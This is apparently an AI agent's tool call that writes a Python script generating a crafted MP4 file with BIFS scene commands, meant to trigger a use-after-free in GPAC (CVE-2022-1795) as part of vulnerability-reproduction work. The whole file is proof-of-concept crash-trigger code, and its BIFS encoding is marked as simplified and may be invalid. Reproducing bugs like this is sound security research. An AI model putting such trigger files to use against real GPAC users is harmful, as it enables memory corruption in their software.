  write_file with args {'file_path': '/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2022-1795/round2/gen_testcase_round2.py', 'content': '#!/usr/bin/env python3\n"""\nGenerate MP4 with BIFS scene to trigger heap-use-after-free in gf_node_try_destroy.\n\nThe vulnerability occurs when:\n1. BIFS commands create and reference nodes\n2. Multiple commands reference the same node\n3. During cleanup (gf_sm_del), nodes are freed but stale pointers remain\n4. gf_sg_command_del tries to destroy already-freed nodes -> UAF\n\nKey insight from coverage: Previous test had no valid BIFS commands in au->commands list,\nso gf_sg_command_del was never called. We need to generate a valid BIFS bitstream.\n"""\n\nimport struct\nimport sys\n\ndef write_box(box_type, data):\n    """Write an MP4 box with size and type"""\n    size = len(data) + 8\n    return struct.pack(\'>I\', size) + box_type + data\n\ndef write_ftyp():\n    """File type box"""\n    data = b\'isom\' + struct.pack(\'>I\', 512) + b\'isomiso2mp41\'\n    return write_box(b\'ftyp\', data)\n\ndef write_mvhd():\n    """Movie header box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 0)  # creation_time\n    data += struct.pack(\'>I\', 0)  # modification_time\n    data += struct.pack(\'>I\', 1000)  # timescale\n    data += struct.pack(\'>I\', 3000)  # duration\n    data += struct.pack(\'>I\', 0x00010000)  # rate\n    data += struct.pack(\'>H\', 0x0100)  # volume\n    data += struct.pack(\'>H\', 0)  # reserved\n    data += struct.pack(\'>II\', 0, 0)  # reserved\n    matrix = [0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000]\n    for m in matrix:\n        data += struct.pack(\'>I\', m)\n    data += struct.pack(\'>IIIIII\', 0, 0, 0, 0, 0, 0)  # pre_defined\n    data += struct.pack(\'>I\', 2)  # next_track_ID\n    return write_box(b\'mvhd\', data)\n\ndef write_tkhd():\n    """Track header box"""\n    data = struct.pack(\'>I\', 0x7)  # version + flags\n    data += struct.pack(\'>I\', 0)  # creation_time\n    data += struct.pack(\'>I\', 0)  # modification_time\n    data += struct.pack(\'>I\', 1)  # track_ID\n    data += struct.pack(\'>I\', 0)  # reserved\n    data += struct.pack(\'>I\', 3000)  # duration\n    data += struct.pack(\'>II\', 0, 0)  # reserved\n    data += struct.pack(\'>H\', 0)  # layer\n    data += struct.pack(\'>H\', 0)  # alternate_group\n    data += struct.pack(\'>H\', 0)  # volume\n    data += struct.pack(\'>H\', 0)  # reserved\n    matrix = [0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000]\n    for m in matrix:\n        data += struct.pack(\'>I\', m)\n    data += struct.pack(\'>I\', 0x01400000)  # width\n    data += struct.pack(\'>I\', 0x00F00000)  # height\n    return write_box(b\'tkhd\', data)\n\ndef write_mdhd():\n    """Media header box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 0)  # creation_time\n    data += struct.pack(\'>I\', 0)  # modification_time\n    data += struct.pack(\'>I\', 1000)  # timescale\n    data += struct.pack(\'>I\', 3000)  # duration\n    data += struct.pack(\'>H\', 0x55c4)  # language (und)\n    data += struct.pack(\'>H\', 0)  # pre_defined\n    return write_box(b\'mdhd\', data)\n\ndef write_hdlr():\n    """Handler reference box - scene handler"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 0)  # pre_defined\n    data += b\'sdsm\'  # handler_type (scene description)\n    data += struct.pack(\'>III\', 0, 0, 0)  # reserved\n    data += b\'GPAC BIFS Handler\\x00\'  # name\n    return write_box(b\'hdlr\', data)\n\ndef write_bifs_config():\n    """\n    Generate minimal BIFSConfig for decoder.\n    Based on GPAC\'s BIFS decoder expectations.\n    """\n    # Simple BIFSConfig: isCommandStream=1, pixelMetric=1\n    # Minimal config with nodeIDbits=4, routeIDbits=0, protoIDbits=0\n    config = bytearray()\n    # Byte 0: isCommandStream(1) | pixelMetric(1) | pixelWidth(5 bits start)\n    config.append(0xC0)  # 11000000 = isCommandStream=1, pixelMetric=1\n    # More bytes for width/height (simplified)\n    config.append(0x00)\n    config.append(0x00)\n    return bytes(config)\n\ndef write_esds():\n    """Elementary stream descriptor box for BIFS"""\n    es_desc = bytearray()\n    \n    # ES_DescrTag (0x03)\n    es_desc.append(0x03)\n    es_id_start = len(es_desc)\n    es_desc.append(0x80)\n    es_desc.append(0x80)\n    es_desc.append(0x80)\n    es_desc.append(0x00)  # Placeholder\n    \n    # ES_ID\n    es_desc.extend(struct.pack(\'>H\', 1))\n    # Flags\n    es_desc.append(0x00)\n    \n    # DecoderConfigDescriptor (0x04)\n    es_desc.append(0x04)\n    dec_config_start = len(es_desc)\n    es_desc.append(0x80)\n    es_desc.append(0x80)\n    es_desc.append(0x80)\n    es_desc.append(0x00)  # Placeholder\n    \n    # objectTypeIndication (BIFS v2 = 0x02)\n    es_desc.append(0x02)\n    # streamType (Scene = 0x03) << 2 | upstream=0 | reserved=1\n    es_desc.append((0x03 << 2) | 0x01)\n    # bufferSizeDB\n    es_desc.extend(struct.pack(\'>I\', 0x001800)[1:])\n    # maxBitrate\n    es_desc.extend(struct.pack(\'>I\', 0x0001F400))\n    # avgBitrate\n    es_desc.extend(struct.pack(\'>I\', 0x0001F400))\n    \n    # DecoderSpecificInfo (0x05)\n    es_desc.append(0x05)\n    bifs_cfg = write_bifs_config()\n    es_desc.append(len(bifs_cfg))\n    es_desc.extend(bifs_cfg)\n    \n    # Fix DecoderConfigDescriptor size\n    dec_config_size = len(es_desc) - dec_config_start - 4\n    es_desc[dec_config_start + 3] = dec_config_size\n    \n    # SLConfigDescriptor (0x06)\n    es_desc.append(0x06)\n    es_desc.append(0x01)\n    es_desc.append(0x02)  # predefined = 2 (MP4)\n    \n    # Fix ES_Descriptor size\n    es_id_size = len(es_desc) - es_id_start - 4\n    es_desc[es_id_start + 3] = es_id_size\n    \n    data = struct.pack(\'>I\', 0) + bytes(es_desc)\n    return write_box(b\'esds\', data)\n\ndef write_stsd():\n    """Sample description box for BIFS"""\n    entry = bytearray()\n    entry.extend(struct.pack(\'>I\', 0))  # size placeholder\n    entry.extend(b\'mp4s\')  # format\n    entry.extend(struct.pack(\'>I\', 0))  # reserved\n    entry.extend(struct.pack(\'>H\', 0))  # reserved\n    entry.extend(struct.pack(\'>H\', 1))  # data_reference_index\n    \n    esds_data = write_esds()\n    entry.extend(esds_data)\n    \n    entry_size = len(entry)\n    entry[0:4] = struct.pack(\'>I\', entry_size)\n    \n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += bytes(entry)\n    return write_box(b\'stsd\', data)\n\ndef write_stts():\n    """Time-to-sample box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', 1)  # sample_count\n    data += struct.pack(\'>I\', 3000)  # sample_delta\n    return write_box(b\'stts\', data)\n\ndef write_stsc():\n    """Sample-to-chunk box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', 1)  # first_chunk\n    data += struct.pack(\'>I\', 1)  # samples_per_chunk\n    data += struct.pack(\'>I\', 1)  # sample_description_index\n    return write_box(b\'stsc\', data)\n\ndef write_stsz(sample_size):\n    """Sample size box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 0)  # sample_size (0 = variable)\n    data += struct.pack(\'>I\', 1)  # sample_count\n    data += struct.pack(\'>I\', sample_size)  # entry_size[0]\n    return write_box(b\'stsz\', data)\n\ndef write_stco(offset):\n    """Chunk offset box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', offset)  # chunk_offset[0]\n    return write_box(b\'stco\', data)\n\nclass BitstreamWriter:\n    """Helper to write bit-level data for BIFS"""\n    def __init__(self):\n        self.data = bytearray()\n        self.current_byte = 0\n        self.bit_position = 0\n    \n    def write_bits(self, value, num_bits):\n        """Write num_bits from value"""\n        for i in range(num_bits - 1, -1, -1):\n            bit = (value >> i) & 1\n            self.current_byte = (self.current_byte << 1) | bit\n            self.bit_position += 1\n            if self.bit_position == 8:\n                self.data.append(self.current_byte)\n                self.current_byte = 0\n                self.bit_position = 0\n    \n    def flush(self):\n        """Flush remaining bits"""\n        if self.bit_position > 0:\n            self.current_byte <<= (8 - self.bit_position)\n            self.data.append(self.current_byte)\n            self.current_byte = 0\n            self.bit_position = 0\n        return bytes(self.data)\n\ndef write_bifs_sample():\n    """\n    Create a BIFS sample with commands that trigger UAF.\n    \n    BIFS command format:\n    - Command type (2 bits): 0=Insert, 1=Delete, 2=Replace, 3=SceneReplace\n    - More bit (1 bit): 1 if more commands follow\n    \n    Strategy: Create SceneReplace with nodes, then additional commands\n    that reference those nodes, creating the UAF condition.\n    """\n    bs = BitstreamWriter()\n    \n    # Command 1: SceneReplace (type=3)\n    bs.write_bits(3, 2)  # SceneReplace command\n    \n    # SceneReplace creates root scene with a Group node\n    # Node type: Group (TAG_MPEG4_Group = 24 in BIFS, encoded as node index)\n    # Simplified: write node creation\n    bs.write_bits(1, 1)  # hasNode = 1\n    bs.write_bits(24, 8)  # Node type (Group, simplified encoding)\n    \n    # Group node fields (simplified, just mark end)\n    bs.write_bits(0, 1)  # No more fields\n    \n    # More commands to follow\n    bs.write_bits(1, 1)  # more = 1\n    \n    # Command 2: Insert command (type=0) - insert another node\n    bs.write_bits(0, 2)  # Insert command\n    bs.write_bits(0, 4)  # NodeID = 0 (target node)\n    bs.write_bits(0, 8)  # fieldIndex = 0 (children field)\n    bs.write_bits(0, 5)  # position = 0\n    \n    # Insert a new Group node\n    bs.write_bits(1, 1)  # hasNode = 1\n    bs.write_bits(24, 8)  # Node type (Group)\n    bs.write_bits(0, 1)  # No fields\n    \n    # More commands\n    bs.write_bits(1, 1)  # more = 1\n    \n    # Command 3: Replace command (type=2) - this will reference a node\n    bs.write_bits(2, 2)  # Replace command\n    bs.write_bits(0, 4)  # NodeID = 0\n    bs.write_bits(0, 8)  # fieldIndex = 0\n    \n    # Replace with another Group node (creates another node reference)\n    bs.write_bits(1, 1)  # hasNode = 1\n    bs.write_bits(24, 8)  # Node type (Group)\n    bs.write_bits(0, 1)  # No fields\n    \n    # No more commands\n    bs.write_bits(0, 1)  # more = 0\n    \n    return bs.flush()\n\ndef generate_mp4():\n    """Generate complete MP4 file with BIFS scene"""\n    output = bytearray()\n    \n    # ftyp box\n    ftyp = write_ftyp()\n    output.extend(ftyp)\n    \n    # Build sample first\n    bifs_sample = write_bifs_sample()\n    mdat_data = write_box(b\'mdat\', bifs_sample)\n    \n    # Build moov structure\n    moov_data = bytearray()\n    moov_data.extend(write_mvhd())\n    \n    # trak\n    trak_data = bytearray()\n    trak_data.extend(write_tkhd())\n    \n    # mdia\n    mdia_data = bytearray()\n    mdia_data.extend(write_mdhd())\n    mdia_data.extend(write_hdlr())\n    \n    # minf\n    minf_data = bytearray()\n    \n    # nmhd (null media header)\n    nmhd_data = struct.pack(\'>I\', 0)\n    nmhd = write_box(b\'nmhd\', nmhd_data)\n    minf_data.extend(nmhd)\n    \n    # dinf\n    dref_data = struct.pack(\'>I\', 0) + struct.pack(\'>I\', 1)\n    dref_entry = struct.pack(\'>I\', 12) + b\'url \' + struct.pack(\'>I\', 0x000001)\n    dref_data += dref_entry\n    dref = write_box(b\'dref\', dref_data)\n    dinf = write_box(b\'dinf\', dref)\n    minf_data.extend(dinf)\n    \n    # stbl - build twice to get correct offset\n    stbl_data = bytearray()\n    stbl_data.extend(write_stsd())\n    stbl_data.extend(write_stts())\n    stbl_data.extend(write_stsc())\n    stbl_data.extend(write_stsz(len(bifs_sample)))\n    stbl_data.extend(write_stco(0))  # Placeholder\n    \n    minf_data.extend(write_box(b\'stbl\', bytes(stbl_data)))\n    mdia_data.extend(write_box(b\'minf\', bytes(minf_data)))\n    trak_data.extend(write_box(b\'mdia\', bytes(mdia_data)))\n    moov_data.extend(write_box(b\'trak\', bytes(trak_data)))\n    \n    moov = write_box(b\'moov\', bytes(moov_data))\n    \n    # Calculate actual mdat offset\n    mdat_offset = len(ftyp) + len(moov) + 8\n    \n    # Rebuild with correct offset\n    stbl_data = bytearray()\n    stbl_data.extend(write_stsd())\n    stbl_data.extend(write_stts())\n    stbl_data.extend(write_stsc())\n    stbl_data.extend(write_stsz(len(bifs_sample)))\n    stbl_data.extend(write_stco(mdat_offset))\n    \n    moov_data = bytearray()\n    moov_data.extend(write_mvhd())\n    trak_data = bytearray()\n    trak_data.extend(write_tkhd())\n    mdia_data = bytearray()\n    mdia_data.extend(write_mdhd())\n    mdia_data.extend(write_hdlr())\n    minf_data = bytearray()\n    minf_data.extend(nmhd)\n    minf_data.extend(dinf)\n    minf_data.extend(write_box(b\'stbl\', bytes(stbl_data)))\n    mdia_data.extend(write_box(b\'minf\', bytes(minf_data)))\n    trak_data.extend(write_box(b\'mdia\', bytes(mdia_data)))\n    moov_data.extend(write_box(b\'trak\', bytes(trak_data)))\n    \n    # Final assembly\n    output.extend(write_box(b\'moov\', bytes(moov_data)))\n    output.extend(mdat_data)\n    \n    return bytes(output)\n\nif __name__ == \'__main__\':\n    output_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2022-1795/round2/testcase-round2\'\n    \n    mp4_data = generate_mp4()\n    \n    with open(output_path, \'wb\') as f:\n        f.write(mp4_data)\n    \n    print(f"Generated MP4 test case: {output_path}")\n    print(f"File size: {len(mp4_data)} bytes")\n    print(f"BIFS sample included with SceneReplace, Insert, and Replace commands")\n'}
